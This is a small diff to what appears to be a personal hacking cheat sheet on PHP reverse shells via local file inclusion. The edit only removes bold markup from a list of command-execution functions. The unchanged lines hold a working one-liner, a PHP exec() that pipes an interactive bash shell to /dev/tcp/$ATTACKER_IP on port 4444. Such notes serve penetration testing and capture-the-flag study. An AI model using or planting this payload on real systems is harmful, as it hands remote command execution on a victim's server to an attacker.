@@ -12,7 +12,7 @@ PHP Reverse shell LFI:
 ---
 #php #rev-shell #reverse #rev 
 
-or use system() exec() passthru() **shell_exec**()
+or use system() exec() passthru() shell_exec()
 
 ```php
 <?php exec("/bin/bash -c 'bash -i > /dev/tcp/$ATTACKER_IP/4444 0>&1'");?>
